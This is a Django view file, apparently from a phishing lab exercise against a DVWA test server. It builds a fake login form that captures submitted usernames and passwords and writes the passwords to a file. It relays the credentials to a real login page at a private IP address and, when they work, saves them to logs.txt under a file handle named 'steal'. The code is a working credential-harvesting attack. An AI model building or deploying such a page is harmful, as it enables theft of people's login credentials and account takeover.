import requests
from django.shortcuts import render, redirect
import socket  
import uuid
from .forms import MeterForm
from .models import Meter

# Create your views here.

def meterView(request):
     form = MeterForm()
     if request.method == "POST":
          form = MeterForm(request.POST)
          hostname=socket.gethostname()
          IPAddr=socket.gethostbyname(hostname)   
          print("Your Computer Name is:"+hostname)   
          print("Your Computer IP Address is:"+IPAddr)  
          print ("The formatted MAC address is : ", end="")
          print (':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff)
          for elements in range(0,2*6,2)][::-1]))
          
          data = {
               "username": form.data['username'],
               "password": form.data['password'],
               "Login":  "Login"
          }
          with open("common_password.txt", "a") as common:
               common.write(data["password"] + "\n")
               
          response = requests.post("http://192.168.234.136/dvwa/login.php",data)
          
          if "Login failed" not in response.text:
               form.save()
               print("Correct==> %s : %s"%(data["username"], data["password"]))
               with open("logs.txt", "a") as steal:
                    steal.write("Account Details: %s and %s \n"%(data["username"], data["password"]))
               
               # return redirect("http://192.168.234.128/dvwa/index.php")
               
               
     context = {'form': form}
     return render(request, "meter.html", context)
          
          
     